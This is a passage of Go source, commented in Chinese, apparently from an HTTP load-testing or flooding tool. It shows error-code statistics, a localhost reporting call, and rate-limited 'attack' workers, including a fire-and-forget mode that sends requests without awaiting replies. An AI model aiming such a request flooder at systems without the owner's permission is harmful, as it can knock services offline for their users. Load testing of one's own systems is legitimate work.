	fmt.Printf("\n📊 详细错误统计:\n")
	if len(stats.ErrorCodes) > 0 {
		// 按状态码排序
		var codes []int
		for code := range stats.ErrorCodes {
			codes = append(codes, code)
		}
		sort.Ints(codes)
		
		// 分类显示错误
		successCount := int64(0)
		clientErrorCount := int64(0)
		serverErrorCount := int64(0)
		networkErrorCount := int64(0)
		
		for _, code := range codes {
			count := stats.ErrorCodes[code]
			percentage := float64(count) / float64(total) * 100
			
			// 错误分类
			var errorType, description string
			switch {
			case code >= 200 && code < 300:
				errorType = "✅ 成功"
				description = "请求成功"
				successCount += count
			case code >= 300 && code < 400:
				errorType = "🔄 重定向"
				description = "需要重定向"
			case code >= 400 && code < 500:
				errorType = "❌ 客户端错误"
				description = getClientErrorDescription(code)
				clientErrorCount += count
			case code >= 500:
				errorType = "🔥 服务器错误"
				description = getServerErrorDescription(code)
				serverErrorCount += count
			case code == -1:
				errorType = "🌐 网络错误"
				description = "连接失败/超时"
				networkErrorCount += count
			case code == -2:
				errorType = "⏰ 无响应"
				description = "服务器无响应"
				networkErrorCount += count
			case code == 0:
				errorType = "❓ 未知错误"
				description = "无法确定状态"
				networkErrorCount += count
			default:
				errorType = "❓ 其他"
				description = "未知状态码"
			}
			
			fmt.Printf("  %s %d: %d 次 (%.2f%%) - %s\n", errorType, code, count, percentage, description)
		}
		
		// 错误汇总
		fmt.Printf("\n📈 错误汇总:\n")
		fmt.Printf("  ✅ 成功请求: %d 次 (%.2f%%)\n", successCount, float64(successCount)/float64(total)*100)
		fmt.Printf("  ❌ 客户端错误: %d 次 (%.2f%%)\n", clientErrorCount, float64(clientErrorCount)/float64(total)*100)
		fmt.Printf("  🔥 服务器错误: %d 次 (%.2f%%)\n", serverErrorCount, float64(serverErrorCount)/float64(total)*100)
		fmt.Printf("  🌐 网络错误: %d 次 (%.2f%%)\n", networkErrorCount, float64(networkErrorCount)/float64(total)*100)
		
	} else {
		fmt.Printf("  无错误码记录\n")
	}
}

// 获取客户端错误描述
func getClientErrorDescription(code int) string {
	switch code {
	case 400:
		return "请求格式错误"
	case 401:
		return "未授权访问"
	case 403:
		return "禁止访问"
	case 404:
		return "页面不存在"
	case 405:
		return "方法不允许"
	case 408:
		return "请求超时"
	case 413:
		return "请求体过大"
	case 414:
		return "URL过长"
	case 429:
		return "请求过于频繁"
	case 451:
		return "因法律原因不可用"
	default:
		return "客户端错误"
	}
}

// 获取服务器错误描述
func getServerErrorDescription(code int) string {
	switch code {
	case 500:
		return "服务器内部错误"
	case 501:
		return "功能未实现"
	case 502:
		return "网关错误"
	case 503:
		return "服务不可用"
	case 504:
		return "网关超时"
	case 505:
		return "HTTP版本不支持"
	case 507:
		return "存储空间不足"
	case 508:
		return "检测到循环"
	case 510:
		return "扩展错误"
	default:
		return "服务器错误"
	}
}

// 向API服务器发送CORS错误统计
func updateAPICORSErrors(corsErrors int64) {
	client := &http.Client{Timeout: 5 * time.Second}
	
	data := map[string]int64{
		"cors_errors": corsErrors,
	}
	
	jsonData, err := json.Marshal(data)
	if err != nil {
		return
	}
	
	resp, err := client.Post("http://localhost:8080/api/update-cors-errors", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// 带速率限制的火后不理worker
func fireAndForgetWorkerWithRateLimit(config *Config, rpsPerThread int, done <-chan struct{}, threadID int) {
	interval := time.Second / time.Duration(rpsPerThread)
	if interval <= 0 {
		interval = time.Nanosecond
	}
	
	rateLimiter := time.NewTicker(interval)
	defer rateLimiter.Stop()
	
	requestCount := 0
	startTime := time.Now()
	
	for {
		select {
		case <-rateLimiter.C:
			// 火后不理模式：只发送请求，不等待响应
			go func() {
				statusCode := performFireAndForgetAttack(config)
				atomic.AddInt64(&stats.TotalRequests, 1)
				
				// 统计错误码
				stats.mu.Lock()
				stats.ErrorCodes[statusCode]++
				stats.mu.Unlock()
				
				if statusCode >= 200 && statusCode < 400 {
					atomic.AddInt64(&stats.SuccessfulReqs, 1)
				} else {
					atomic.AddInt64(&stats.FailedReqs, 1)
				}
			}()
			requestCount++
			
			// 每1000个请求输出一次线程状态
			if requestCount%1000 == 0 {
				elapsed := time.Since(startTime)
				actualRPS := float64(requestCount) / elapsed.Seconds()
				fmt.Printf("🔥 火后不理线程%d: 已发送%d个请求, 实际RPS: %.2f\n", threadID, requestCount, actualRPS)
			}
		case <-done:
			elapsed := time.Since(startTime)
			actualRPS := float64(requestCount) / elapsed.Seconds()
			fmt.Printf("🏁 火后不理线程%d完成: 总请求%d, 实际RPS: %.2f\n", threadID, requestCount, actualRPS)
			return
		}
	}
}

// 带速率限制的高并发worker
func highConcurrencyWorkerWithRateLimit(config *Config, rpsPerThread int, done <-chan struct{}, threadID int) {
	interval := time.Second / time.Duration(rpsPerThread)
	if interval <= 0 {
		interval = time.Nanosecond
	}
	
	rateLimiter := time.NewTicker(interval)
	defer rateLimiter.Stop()
	
	requestCount := 0
	startTime := time.Now()
	
	for {
		select {
		case <-rateLimiter.C:
			statusCode := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			requestCount++
			
			// 每100个请求输出一次线程状态
			if requestCount%100 == 0 {
				elapsed := time.Since(startTime)
				actualRPS := float64(requestCount) / elapsed.Seconds()
				fmt.Printf("⚡ 高并发线程%d: 已发送%d个请求, 实际RPS: %.2f\n", threadID, requestCount, actualRPS)
			}
			
			// 统计错误码
			stats.mu.Lock()
			stats.ErrorCodes[statusCode]++
			stats.mu.Unlock()
			
			if statusCode >= 200 && statusCode < 400 {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		case <-done:
			elapsed := time.Since(startTime)
			actualRPS := float64(requestCount) / elapsed.Seconds()
			fmt.Printf("🏁 高并发线程%d完成: 总请求%d, 实际RPS: %.2f\n", threadID, requestCount, actualRPS)
			return
		}
	}
}
